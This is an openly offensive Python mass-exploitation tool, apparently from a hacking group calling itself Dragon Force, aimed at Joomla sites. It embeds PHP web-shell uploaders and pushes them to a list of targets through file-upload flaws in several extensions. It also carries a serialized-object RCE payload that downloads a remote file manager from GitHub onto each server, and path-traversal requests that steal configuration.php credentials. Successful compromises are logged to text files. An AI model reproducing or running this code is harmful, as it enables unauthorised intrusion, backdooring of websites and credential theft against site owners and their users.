#!/usr/bin/python

# Hackers Make A Tools
# Not Tools Make A Hackers
# Officially Author; Acai Kacak

import requests, sys, os, re
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)										
import time
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

########################
##### En Banglasia #####
########################

shell = """ <?php echo 'Priv8 Uploaders By Dragon Force!'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('Priv8 Uploaders By Dragon Force!'); 	 	 </script><b>Fuckedz!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
shell_2 = """<?php 
error_reporting(0);
$Ye = "_Ye";
if(isset($_GET["DragonForce"]))
	{
		echo"Priv8 Uploaders By Dragon Force!{$Ye} <font color=#000FFF>[uname]".php_uname()."[/uname]";echo "<br>";print "\n";if(@ini_get("disable_functions")){echo "DisablePHP=".@ini_get("disable_functions");}else{ echo "Disable PHP = NONE";}echo "<br>";print "\n";if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";} echo "<br>";print "\n";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>Fuckedz!</b>-->".$_FILES["f"]["name"];}else{echo"<b>Failed!";}} }

echo 'uname:'.php_uname()."\n";
echo getcwd() . "\n";

?>"""


shell_name = str(time.time())[:-3]
filename = "DragonForce"+shell_name+".php"

start_raw = raw_input('Your List Please : ')
try:
    with open(start_raw, 'r') as f:
        woh = f.read().splitlines()
except IOError:
    pass
woh = list((woh))




class Master:
	
	
	def __init__(self):
	
		if system() == 'Linux':
			os.system('clear')
		if system() == 'Windows':
			os.system('cls')
		
			banner = """{}{} \n \n



		
$$$$$$$\                                                         $$$$$$$$\                                      
$$  __$$\                                                        $$  _____|                                     
$$ |  $$ | $$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\        $$ |    $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\  
$$ |  $$ |$$  __$$\ \____$$\ $$  __$$\ $$  __$$\ $$  __$$\       $$$$$\ $$  __$$\ $$  __$$\ $$  _____|$$  __$$\ 
$$ |  $$ |$$ |  \__|$$$$$$$ |$$ /  $$ |$$ /  $$ |$$ |  $$ |      $$  __|$$ /  $$ |$$ |  \__|$$ /      $$$$$$$$ |
$$ |  $$ |$$ |     $$  __$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |      $$ |   $$ |  $$ |$$ |      $$ |      $$   ____|
$$$$$$$  |$$ |     \$$$$$$$ |\$$$$$$$ |\$$$$$$  |$$ |  $$ |      $$ |   \$$$$$$  |$$ |      \$$$$$$$\ \$$$$$$$\ 
\_______/ \__|      \_______| \____$$ | \______/ \__|  \__|      \__|    \______/ \__|       \_______| \_______|
                             $$\   $$ |                                                                         
                             \$$$$$$  |                                                                         
                              \______/                                                                          
					   
						 
						 
											
		   
			

				\n""".format(fc, sb)
		
			print banner
	
	
	
	# def com_foxcontact(self, url):
	
		# try:
			
			
			# check_fox = requests.get(url+'/index.php?option=com_foxcontact&amp;view=invalid')
			
			# if 'com_foxcontact' in check_fox.content:
				# print '{}[+]:{}{} => {}{} Com_FoxContacts => {}{} Vulnerability!  '.format(sb, sd, url, fc,fc, sb,fg)
				

				# cids = re.findall('<a name="b2jcomid_(.*?)"></a>',opreq, 'foxcontact&amp;Itemid=(.*?)" >',check_fox.content)
				
				# for cid in cids:
					# cid = str(cid)
					
					# blackb0x = ["index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=/../../"+halah, "/components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../{}".format(cid, cid, filename), "/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../{}".format(cid, cid, cid, filename), "/index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../{}".format(cid, cid, cid, cid, filename), "/components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../{}".format(cid, cid, filename)]
					
					# ids = 0
					# for b0x in blackb0x:
						# ids += 1
						# vuln_urls = url + b0x
					
						# req_fox = requests.post(vuln_urls, data=shell)
						
						# print( "\n[!] exploiting in {}...".format(ids))
						
						# check_shells = requests.get(url+'/components/com_foxcontact/'+filename)
						
						# if 'En Banglasia!' in check_shells:
							# print '{}[Target]: {}{} => {}{} RCE => {}{} Fuckedz!  {} '.format(sb, sd, url, fc,fc, sb,fg, ids)

							
						# else:
							# print '{}[Target]: {}{} => {}{} Com_FoxContacts => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
	
	
			# else:
				# print '{}[Target]: {}{} => {}{} Com_FoxContacts => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
		
		
		# except:
			# pass
	
	def com_rce(self,url):
	
	
		try:
		
		
			pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/DragonForce.php','w+'),file_get_contents('https://raw.githubusercontent.com/apidotmy/Uploaders/master/FilesManager.php'));")
			
			rce_url(url,pl)
			
			req_rce = requests.get(url+'/DragonForce.php?DragonForce')
			
			if 'Dragon Force!' in req_rce.content:
			
				print '{}[Target]: {}{} => {}{} RCE => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fg)
				open('Shells.txt', 'a').write(url+'/DragonForce.php?DragonForce'+'\n')
		
		
			else:
			
				print '{}[Target]: {}{} => {}{} RCE => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
		
		except:
			pass
			
			
			
	def com_jdownloads(self, url):
	
	
	
		try:
		
			
			filename1 = "DragonForce.php.j"
			
			
			com_jd_up = { 'file_upload':(filename1, shell_2, 'text/html'), 'pic_upload':(filename1, shell_2, 'text/html')}

			com_jd_dat = { 'name': 'Dragon Force', 'mail': 'dragonforce@dragonforce.my', 'catlist': '1', 'filetitle': "Fuck3dz By Dragon Force!",
					 'description': "<p>Fuck3dz By Dragon Force!</p>" , '2d1a8f3bd0b5cf542e9312d74fc9766f': 1, 'send': 1, 'senden': "Send file",
					 'description': "<p>Fuck3dz By Dragon Force!</p>", 'option': "com_jdownloads", 'task': "upload" }
			
			
			req_jd = requests.post(url+'/index.php?option=com_jdownloads&Itemid=1&task=upload', data=com_jd_dat, files=com_jd_up)
			
			
			shell_jd = requests.get(url+'/images/jdownloads/screenshots/DragonForce.php.j?DragonForce')
		
			if 'Dragon Force!' in shell_jd.content:
				
				print '{}[Target]: {}{} => {}{} Jdownloads => {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
				open('Shells.txt', 'a').write(url+'/images/jdownloads/screenshots/DragonForce.php.j?DragonForce'+'\n')
				
			else:
				print '{}[Target]: {}{} => {}{} Jdownloads => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
		
		
		
		
		except:
			pass
			
			
		
	def com_jbcatalog(self, url):
		
		try:
			

			
			
			check_jbcatalog = requests.get(url+'/components/com_jbcatalog/libraries/jsupload/')

			if 'jQuery File' in check_jbcatalog.content:
			
				print '{}[+]: {}{} => {}{} Com_Jbcatalog => {}{} Vulnerability!  '.format(sb, sd, url, fc,fc, sb,fg)
				
				com_jbcatalog = {'files[]':(filename, shell, 'text/html')}
				
				
				req_jbcatalog = requests.post(url+'/components/com_jbcatalog/libraries/jsupload/server/php/', files=com_jbcatalog)
				
				
				Shell_jbcatalog = requests.get(url+'/com_jbcatalog/libraries/jsupload/server/php/files/'+str(filename))
				
				if 'Dragon Force!' in Shell_jbcatalog.content:
					print '{}[Target]: {}{} => {}{} Com_Jbcatalog => {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
					open('Shells.txt', 'a').write(url+'/com_jbcatalog/libraries/jsupload/server/php/files/'+str(filename)+'\n')
					
					
				else:
					print '{}[Target]: {}{} => {}{} Com_Jbcatalog => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
					
					
					
			else:
				print '{}[Target]: {}{} => {}{} Com_Jbcatalog => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
				
		except:
			pass
			
			
	def com_fabrik(self, url):
	
		
		try:

		
			check_fabrik = requests.get(url+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload')
			
			
			if 'filepath":' in check_fabrik.content:
			
				print '{}[+]:{}{} => {}{} Com_Fabrik => {}{} Vulnerability!  '.format(sb, sd, url, fc,fc, sb,fg)

			elif 'null,' in check_fabrik.content:

				print '{}[+]:{}{} => {}{} Com_Fabrik => {}{} Vulnerability!  '.format(sb, sd, url, fc,fc, sb,fg)

			elif 'error":' in check_fabrik.content:

				print '{}[+]:{}{} => {}{} Com_Fabrik => {}{} Vulnerability!  '.format(sb, sd, url, fc,fc, sb,fg)
				
				com_fabrik = {'file':(filename, shell, 'text/html')}
				
				
				req_fabrik = requests.post(url+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload', files=com_fabrik)
				
				Shell_fabrik = requests.get(url+'/'+str(filename))
				
				if 'Dragon Force!' in Shell_fabrik.content:			
					print '{}[Target]: {}{} => {}{} Com_Fabrik => {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
					open('Shells.txt', 'a').write(url+'/'+str(filename)+'\n')
					
					
				else:
					print '{}[Target]: {}{} => {}{} Com_Fabrik => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
					
			
			
			
			else:
				print '{}[Target]: {}{} => {}{} Com_Fabrik => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
		
		except:
			pass
		
		
	def com_b2jcontact(self, url):
	
		try:
			vuln_url = url+'/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../'+filename
			
			req_b2j = requests.post(vuln_url, data=shell)
			
			
			check_lib = requests.get(url+'/components/'+filename)
			
			if 'Dragon Force!' in check_lib.content:			
				print '{}[Target]: {}{} => {}{} Com_B2J {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
				open('Shells.txt', 'a').write(url+'/components/'+filename+'\n')
						
						
			else:
				print '{}[Target]: {}{} => {}{} Com_B2J => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
						
		except:
			pass
		
	def com_adsmanager(self, url):
		
		try:
			check_adsm = requests.get(url+'/index.php?option=com_adsmanager&task=upload&tmpl=component')
			
			if '{"jsonrpc" : "2.0",' in check_adsm.content:
			
				print '{}[+]: {}{} => {}{} Com_AdsManager => {}{} Vulnerability!  '.format(sb, sd, url, fc,fc, sb,fg)
				
				
				imageshell = "DragonForce.jpg"
				
				com_adsm = {'file':(imageshell, shell), 'name':filename}
				
				
				req_adsm = requests.post(url+'/index.php?option=com_adsmanager&task=upload&tmpl=component', data=com_adsm)
				
				check_shell = requests.get(url+"/tmp/plupload/"+filename)
				
				if 'Dragon Force!' in check_shell.content:
				
					print '{}[Target]: {}{} => {}{} Com_AdsManager => {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
					open('Shells.txt', 'a').write(url+"/tmp/plupload/"+filename+'\n')
				
				else:
					print '{}[Target]: {}{} => {}{} Com_AdsManager => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
			else:		
				print '{}[Target]: {}{} => {}{} Com_AdsManager => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
			
		except:
			pass
		
		
	
	
		
		
	def com_myblog(self, url):
		
		try:
			

			
			check_myblog = requests.get(url+'/index.php?option=com_myblog&task=ajaxupload')
			
			if "{error: 'No file" in check_myblog.content:
			
				print '{}[+]: {}{} => {}{} Com_Myblog => {}{} Vulnerability!  '.format(sb, sd, url, fc,fc, sb,fg)
				
				image_myblog = "DragonForce.php.xxxjpg"
				
				com_myb = {'fileToUpload':(image_myblog, shell)}
				
				req_myblog = requests.post(url+'/index.php?option=com_myblog&task=ajaxupload', files=com_myb)
				
				shell_path = re.findall("source: '(.*?)'",req_myblog.content)
				
				
				site = shell_path[0]
				
			
				check_shell = requests.get(site)
				
				
				if 'Dragon Force!' in check_shell.content:
					print '{}[Target]: {}{} => {}{} Com_Myblog => {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
					open('Shells.txt', 'a').write(site+'\n')
					
				else:
					print '{}[Target]: {}{} => {}{} Com_Myblog => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
					
				
			else:
				print '{}[Target]: {}{} => {}{} Com_Myblog => {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)
	
		except:
			pass
	
	
	def com_configs(self, url, path, line):
		
		
		try:
			req_download = requests.get(url+path)
			
			if 'class JConfig' in req_download.content:
				print '{}[Target]: {}{} => {}{} Com_Configs => {}{} Fuckedz!  {} '.format(sb, sd, url, fc,fc, sb,fg, line)
				open('Configurations.txt', 'a').write(url+path+'\n')
			
			else:
				print '{}[Target]: {}{} => {}{} Com_Configs => ({}) {}{} Failed!  '.format(sb, sd, url, fc,fc, line, sb,fr)
		
		except:
			pass
			
	

def rce_url(url, user_agent):
	
	try:
		headers = {
		'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3', 
		'x-forwarded-for': user_agent  
		}
		cookies = requests.get(url,headers=headers).cookies
		for _ in range(3):
			response = requests.get(url, headers=headers,cookies=cookies)    
		return response
		
	except:
		pass
 
def php_str_noquotes(data):
	try:
	
		"Convert string to chr(xx).chr(xx) for use in php"
		encoded = ""
		for char in data:
			encoded += "chr({0}).".format(ord(char))
	  
		return encoded[:-1]
		
	except:
		pass
	 
  
def generate_payload(php_payload):
	
	try:
	
		php_payload = "eval({0})".format(php_str_noquotes(php_payload))
	  
		terminate = '\xf0\xfd\xfd\xfd';
		exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
		injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
		exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
		exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
	  
		return exploit_template
		
	except:
		pass


BotMaster = Master()

		
def MyLove(url):
	
	try:
		
		url.replace('http://', '').replace('http://', '')
		site = 'http://'+url
		#BotMaster.com_foxcontact(url)
		BotMaster.com_rce(site)
		BotMaster.com_jdownloads(site)
		BotMaster.com_jbcatalog(site)
		BotMaster.com_b2jcontact(site)
		BotMaster.com_fabrik(site)
		BotMaster.com_adsmanager(site)
		BotMaster.com_myblog(site)
		
		pathcfg = {'/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php', '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php','/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php','/index.php?option=com_macgallery&view=download&albumid=../../configuration.php', '/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php'}
		
		lines = 0
		for i in pathcfg:
			lines += 1
			BotMaster.com_configs(site,i, lines)
	except:
		pass
		
def Main():
    try:
        start = timer()
        pp = ThreadPool(17)
        pr = pp.map(MyLove, woh)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()
